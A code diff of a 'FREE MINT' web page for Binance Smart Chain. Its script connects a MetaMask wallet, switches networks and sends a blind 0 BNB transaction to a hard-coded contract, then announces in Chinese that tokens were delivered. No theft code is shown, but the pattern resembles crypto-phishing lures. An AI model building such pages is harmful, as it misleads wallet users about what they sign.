@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>太極 FREE MINT</title>
+<title>太極 • MINT</title>
 <style>
     *{
         margin:0;
@@ -12,7 +12,7 @@
         font-family:sans-serif;
     }
     body{
-        background:#fff;
+        background:#ffffff;
         color:#111;
         min-height:100vh;
         display:flex;
@@ -20,82 +20,159 @@
         justify-content:center;
         padding:20px;
     }
-    .mint-box{
+    .mint-card{
         background:#f9f9f9;
         border-radius:14px;
         padding:2rem;
         border-left:4px solid #ffc107;
         box-shadow:0 4px 12px rgba(0,0,0,0.08);
-        max-width:400px;
+        max-width:480px;
         width:100%;
         text-align:center;
     }
-    .title{
-        font-size:24px;
-        font-weight:bold;
+    .logo{
+        font-size:32px;
+        font-weight:700;
         color:#e69500;
-        margin-bottom:20px;
+        margin-bottom:12px;
+    }
+    h1{
+        font-size:28px;
+        margin-bottom:10px;
+        color:#111;
+    }
+    .subtitle{
+        font-size:16px;
+        color:#666;
+        margin-bottom:30px;
     }
     #mintBtn{
+        display:block;
         width:100%;
         padding:16px;
         border-radius:12px;
+        margin:10px 0;
+        text-align:center;
+        text-decoration:none;
         font-size:16px;
         font-weight:bold;
-        background:#fff;
-        border:2px solid #ffc107;
-        color:#ffc107;
-        box-shadow:0 4px 0 #d48f00;
-        cursor:pointer;
+        transition: all 0.2s ease;
+        user-select: none;
+        background: #ffffff;
+        border: 2px solid #ffc107;
+        color: #ffc107;
+        box-shadow: 
+            0 4px 0 #d48f00,
+            0 6px 12px rgba(255, 193, 7, 0.25),
+            inset 0 1px 0 rgba(255, 255, 255, 0.9);
+        cursor: pointer;
     }
     #mintBtn:hover{
-        transform:translateY(-2px);
+        border-color: #ffd24d;
+        color: #ffd24d;
+        transform: translateY(-2px);
+        box-shadow: 
+            0 6px 0 #d48f00,
+            0 8px 16px rgba(255, 193, 7, 0.3),
+            inset 0 1px 0 rgba(255, 255, 255, 1);
     }
     #mintBtn:active{
-        transform:translateY(2px);
+        border-color: #e6ac00;
+        color: #e6ac00;
+        transform: translateY(2px);
+        box-shadow: 
+            0 2px 0 #d48f00,
+            0 3px 6px rgba(255, 193, 7, 0.25),
+            inset 0 1px 0 rgba(255, 255, 255, 0.7);
+    }
+    #mintBtn:disabled {
+        background: #eee;
+        border-color: #ccc;
+        color: #999;
+        box-shadow: none;
+        cursor: not-allowed;
+        transform: none;
     }
 </style>
 </head>
 <body>
-
-<div class="mint-box">
-    <div class="title">太極 • FREE MINT</div>
+<div class="mint-card">
+    <div class="logo">太極</div>
+    <h1>FREE MINT</h1>
+    <p class="subtitle">Connect wallet to mint for 0 BNB</p>
     <button id="mintBtn">Connect Wallet • Mint</button>
 </div>
 
 <script src="https://cdn.ethers.org/lib-ethers-5.7.2.umd.min.js"></script>
 <script>
-const btn = document.getElementById('mintBtn');
-const contract = "0x1867bB04607FaBa07b512C4df08e7a6A71A6E4C4";
+const contractAddress = "0x1867bB04607FaBa07b512C4df08e7a6A71A6E4C4";
+const chainId = 56; // BSC Mainnet
+const chainIdHex = "0x38";
 
-btn.onclick = async ()=>{
-    if(!window.ethereum){
-        alert('Please install MetaMask');
+const btn = document.getElementById("mintBtn");
+
+btn.onclick = async () => {
+    if (!window.ethereum) {
+        alert("请安装 MetaMask 或使用钱包内置浏览器访问！");
         return;
     }
+
     const provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts",[]);
-    const signer = provider.getSigner();
+    try {
+        // 1. 连接钱包
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const address = await signer.getAddress();
+        console.log("已连接地址:", address);
 
-    btn.textContent = "Processing...";
-    btn.disabled = true;
+        // 2. 检查并切换到 BSC 链
+        const currentNetwork = await provider.getNetwork();
+        if (currentNetwork.chainId !== chainId) {
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: chainIdHex }]
+                });
+            } catch (e) {
+                if (e.code === 4902) {
+                    await window.ethereum.request({
+                        method: "wallet_addEthereumChain",
+                        params: [{
+                            chainId: chainIdHex,
+                            chainName: "Binance Smart Chain Mainnet",
+                            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                            rpcUrls: ["https://bsc-dataseed1.binance.org/"],
+                            blockExplorerUrls: ["https://bscscan.com/"]
+                        }]
+                    });
+                } else {
+                    throw e;
+                }
+            }
+        }
 
-    try{
+        // 3. 按钮状态改为处理中
+        btn.textContent = "Processing...";
+        btn.disabled = true;
+
+        // 4. 发送 0 BNB 交易（核心：这里会弹出交易确认框）
         const tx = await signer.sendTransaction({
-            to:contract,
-            value:0,
-            gasLimit:800000
+            to: contractAddress,
+            value: ethers.constants.Zero, // 0 BNB
+            gasLimit: ethers.utils.hexlify(800000)
         });
+
+        // 5. 等待交易上链
         await tx.wait();
-        alert('Mint Success!');
+        alert("✅ Mint 成功！代币已发放到你的钱包");
         btn.textContent = "MINTED";
-    }catch(e){
-        alert('Failed');
+    } catch (e) {
+        console.error(e);
+        alert("❌ 失败: " + (e.message || "请检查钱包授权或网络"));
         btn.textContent = "Mint Again";
         btn.disabled = false;
     }
-}
+};
 </script>
-
 </body>
 </html>
